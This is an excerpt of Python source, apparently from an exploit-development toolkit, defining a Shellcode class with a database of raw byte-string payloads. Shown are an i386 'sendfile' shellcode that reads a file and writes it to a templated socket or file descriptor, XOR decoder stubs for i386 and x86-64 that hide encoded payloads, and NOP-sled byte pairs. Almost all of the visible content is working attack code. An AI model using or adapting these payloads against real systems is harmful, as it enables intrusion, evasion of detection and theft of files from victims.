...
class Shellcode:
    _database = {
        'i386': {
            ...
            'sendfile': '\xeb\x2b\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xd2\x31\xc9\x8d\x42\x05\xcd\x80\x91\x8d\x5a${fd}\x8d\x72\x01\xc1\xe6\x10\x8d\x82\xbb\x00\x00\x00\xcd\x80\x31\xdb\x8d\x42\x01\xcd\x80\xe8\xd0\xff\xff\xff',
            ...
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x46\xeb\xf8\x90\x90\x90\x90\x90\x90\xe8\xec\xff\xff\xff',
        },
        'x86-64': {
            'noppairs': ['PX', 'QY', 'RZ'],
            ...
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x48\xff\xc6\xeb\xf6\x90\x90\x90\x90\xe8\xec\xff\xff\xff',
        }
    }
